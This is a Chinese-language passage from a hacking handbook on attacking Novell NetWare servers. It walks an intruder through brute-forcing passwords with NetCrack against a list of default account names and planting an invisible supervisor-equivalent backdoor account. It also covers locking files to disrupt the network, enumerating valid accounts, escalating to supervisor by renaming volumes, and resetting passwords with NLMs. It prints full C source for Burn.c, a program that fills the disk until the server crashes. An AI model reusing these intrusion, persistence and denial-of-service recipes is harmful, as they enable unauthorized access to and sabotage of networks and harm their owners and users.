
## 漏洞
所有低于 4.1 的版本。

**入侵：** NetCrack（图 10.17）是 Jim O'Kane 开发的一个程序。通过向 NetWare 的 Bindery 命令中的 `VERIFY_PASSWORD` 函数进行重复的“拨号攻击”，`NetCrack.exe` 试图利用合法查询泄露用户密码。

格式：NETCRACK <UserID>

NetWare 及其关联硬件合作伙伴中常见的用户账户包括：

| PRINT | WANGTEK |
| :------ | :-------- |
| LASER | FAX |
| HPLASER | FAXUSER |

![](img/ba85bb40c695c02adae8cbd6666f2e0c_597_0.png)

**图 10.17** 使用 NetCrack 进行黑客攻击。

| PRINTER | FAXWORKS |
| :-------- | :-------- |
| LASERWRITER | TEST |
| POST | ARCHIVIST |
| MAIL | CHEY_ARCHSVR |
| GATEWAY | WINDOWS_PASSTHRU |
| GATE | ROOT |
| ROUTER | WINSABRE |
| BACKUP | SUPERVISOR |

### 系统控制

# 后门安装

**概要：** 在获得管理员权限后，黑客只需遵循几个简单步骤即可安装后门。

**黑客状态：** 远程控制。

**漏洞：** NetWare NDS。

**入侵：** 在获得 NetWare 操作系统的访问控制权限后，黑尝试安装一个远程控制的隐蔽后门，该后门可能长时间不被察觉。启动此过程有六个简单步骤：

- 1. 在 NWADMIN 中，高亮显示一个现有容器。
- 2. 在此容器内部创建一个新容器。
- 3. 在此新容器内部创建一个用户。
    - a) 允许该用户对其自己的用户对象拥有完全受托人权限。
    - b) 允许该用户对新的容器拥有完全受托人权限。
    - c) 授予该用户超级用户（supervisory）等同权限。
- 4. 修改新用户的访问控制列表（ACL），使其不可见。
- 5. 调整新容器上的继承权限过滤器，使其不可见。
- 6. 将新容器放入 IT 组容器中，以安装后门并使其登录信息出现在显示活动连接的常规工具中。

### 锁定文件

**概要：** 内部和本地黑客可以通过修改文件可用性来制造混乱。

**黑客状态：** 文件控制。

**漏洞：** NetWare 2x, 3x, 4x, IntraNetWare 4x。

**入侵：** 在获得 NetWare 访问权限后，一些黑客热衷于通过锁定文件来制造混乱。这种与名为 The Grenadier（地下黑客/程序员）开发的 Bastard 程序相关的黑客攻击（图 10.18）在心怀不满的员工中很流行。基本上，程序运行后，只需请求用于锁定修改的文件路径。此时，除非攻击者关闭 *Bastard.exe*、注销或关机，否则其他用户无法打开该文件以供使用。本质上，当关键操作系统运行文件成为此漏洞的受害者时，这会导致网络瘫痪。该程序几乎简单得难以使用：唯一的要求是攻击者对目标文件具有读取访问权限。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_598_0.png)

**图 10.18** 使用 Bastard 锁定文件。

## 杂项混乱

### 磁盘使用量消失

**概要：** 黑客可以通过填满所有可用空间来导致硬盘崩溃。

**黑客状态：** 系统崩溃。

**漏洞：** NetWare 2/3。

**入侵：** 由臭名昭著的黑客 Jitsu-Disk 编写的 *Burn.c* 通过错误地以每分钟 1 MB 的速度填满错误日志文件来耗尽可用磁盘空间。在许多较旧的 NetWare 系统中都可能发现此特定攻击的残留痕迹。显然，攻击者无需登录即可执行此实用程序。

# Burn.c

```c
#include <dos.h>
typedef unsigned int uint8;

int shreq(int f, uint8 *req, int rl, uint8 *ans, int al)
{
  union REGS r;
  r.w.cx=rl;
  r.w.dx=al;
  r.w.si=((unsigned)(req));
  r.w.di=((unsigned)(ans));
  r.w.ax=0xf200|f;
  int86(0x21,&r,&r);
}

int setconn(int c) /* connect to first server */
{
  union REGS r;
  r.w.ax=0xf000;  /* set preferred connection nr */
  r.w.dx=c+1;
  int86(0x21,&r,&r);
  return(r.w.ax&0xff);
}

/*
 * Main prog
 */
int main()
{
  int err;
  uint8 *nonsense=(uint8 *)calloc(1,sizeof(uint8)*128);
  err=setconn(0);
  for(;;) shreq(74,nonsense,5,nonsense,0);
}
```

# 其他暴露

本节以地下 Novell NetWare 黑客攻击的汇编作为结尾。

> 本节由 Nomad 移动研究中心（NMRC）协助准备，特别是：Simple Nomad 以及贡献者：Shadowlord, Mindgame, The LAN God, Teiwaz, Fauzan Mirza, David Wagner, Diceman, Craigt, Einar Blaberg, Cyberius, Jungman, RX2, itsme, 和 Greg Miller。

- **区分 Novell NetWare 上的有效账户名。** 任何受限账户都应具有足够的访问权限，以便运行位于 SYS:PUBLIC 目录中的 SYSCON。进入后，输入 SYSCON 并回车。转到用户信息以查看所有已定义账户的列表。使用受限账户你看到的详细信息不会很多，但你可以获取账户和用户的完整姓名。如果你以某种有效身份进入，你可以运行 USERLST.EXE 并获取服务器上所有有效账户的列表。
- 如果你没有访问权限怎么办？在这种情况下，你不能在 LOGIN 提示处尝试任何账户名。无论账户名是否有效，它都会要求你输入密码；如果它是有效的且你猜错了密码，如果入侵者检测（Intruder Detection）处于开启状态，你可能会让管理员知道你在做什么。
- 要确定账户是否有效，从 DOS 提示符开始，使用 MAP.EXE 的本地副本。在加载完 NetWare TSR 至 NETX 或 VLM 后，尝试使用服务器名称和卷 SYS 来映射驱动器，例如：
  ```
  MAP G:=TARGET_SERVER/SYS:APPS <enter>
  ```
- 由于你并没有真正登录，系统会提示你输入登录 ID。如果它是有效的 ID，系统会提示你输入密码。如果不是，你会立即收到错误。当然，如果你选择的 ID 没有密码，你将附加并映射到服务器。
- 你可以使用 ATTACH.EXE 做同样的事情：
  ```
  ATTACH TARGET_SERVER/loginid <enter>
  ```
- 同样，如果这是有效的，系统会提示你输入密码，如果不是，你将收到错误。
- **获取超级用户访问权限的其他方法。** 此技术在 NetWare 3.11 版本中最为有效。当超级用户登录时，一个名为 NW-HACK.EXE 的程序执行以下操作：
  - 1. 超级用户密码被更改为 SUPER_HACKER。
  - 2. 服务器上的每个账户都修改为具有超级用户等同权限。
- **保留后门，再次讨论。** 当黑客拥有系统访问权限时，他们希望有一条具有超级用户等同权限的后路返回。你可以使用 SUPER.EXE，它是专门编写来允许非超级用户切换超级用户等同权限的。如果你使用 NW-Hack 获取访问权限，你可以在管理员移除你的超级用户等同权限之前开启切换开关。如果你获得超级用户等同账户的访问权限，赋予 guest 账户超级用户权限，然后以 Guest 身份登录并也开启切换开关。此时，以原始超级用户账户重新登录，并移除超级用户权限。现在 Guest 可以随时切换开启超级用户权限。
- **获取超级用户访问权限，再次讨论。** 如果你有两个卷或未分配的磁盘空间，你可以使用此黑客手段获取超级用户权限：
  - 1. 取消安装所有卷。
  - 2. 将 SYS: 重命名为 SYSOLD:。
  - 3. 将 VOL1:（或等效物）重命名为 SYS:；或者只是在新磁盘上创建一个新的 SYS:。
  - 4. 重新启动服务器。
  - 5. 安装 SYS: 和 SYSOLD:。
  - 6. 以超级用户身份附加到服务器（注意：无法登录）。
  - 7. 将 SYSOLD:\SYSTEM\NETS*.SYS 重命名为 NETS*.OLD。
  - 8. 取消安装卷。
  - 9. 将卷重命名回正确的名称。
  - 10. 再次重新启动服务器。
  - 11. 以超级用户身份登录，这次无需密码。
  - 12. 运行 BINDREST。

在此时，你应该已经以超级用户身份登录。凭借这些权限，你可以创建一个具有超级用户等同权限的新用户，然后使用此新用户重置超级用户的密码。

# 密码

- **访问密码文件。** 在访问 NetWare 中的密码文件时，版本 2x 和 3x 中的所有对象及其属性都保存在 bindery 文件中，而版本 4.x 中则保存在 NDS 数据库中。对象的一个例子可能是打印机、组、个人账户等。对象属性的例子可能包括账户的密码或完整用户名、组的成员列表或全名。版本 2x 和 3x 中 bindery 文件的属性（或标志）被标记为 Hidden 和 System。这些文件位于 SYS: 卷的 SYSTEM 子目录中，如下所示：
  - 版本 2x: NET$BIND.SYS, NET$BVAL.SYS
  - 版本 3x: NET$OBJ.SYS, NET$PROP.SYS, NET$VAL.SYS
  - NET$BVAL.SYS 和 NET$VAL.SYS 分别是版本 2x 和 3x 中密码的实际存储位置。然而，在版本 4.x 中，文件物理位置不同。通过使用 RCONSOLE 实用程序和 Scan Directory 选项，你可以看到 SYS:\_NETWARE 中的文件：
    - VALUE.NDS: NDS 的一部分
    - BLOCK.NDS: NDS 的一部分
    - ENTRY.NDS: NDS 的一部分
    - PARTITIO.NDS: NDS 分区类型
    - MLS.000: 许可证
    - VALLINCEN.DAT: 许可证验证
- **更多关于破解密码的内容。** 与大多数不安全的局域网一样，为了讨论目的，我们假设入侵者检测是关闭的，并且允许未加密的密码。如果你有权访问控制台，无论是直接站在控制台前还是通过 RCONSOLE，你都可以通过加载 NLM 并传递命令行参数来使用 SETPASS.NLM、SETSPWD.NLM 或 SETPWD.NLM 简单地重置密码：

| NLM | 重置的账户 | 支持的 NetWare 版本 |
|---|---|---|
| SETPASS.NLM | 超级用户 | 3x |
| SETSPWD.NLM | 超级用户 | 3x, 4x |
| SETPWD.NLM | 任何有效账户 | 3x, 4x |

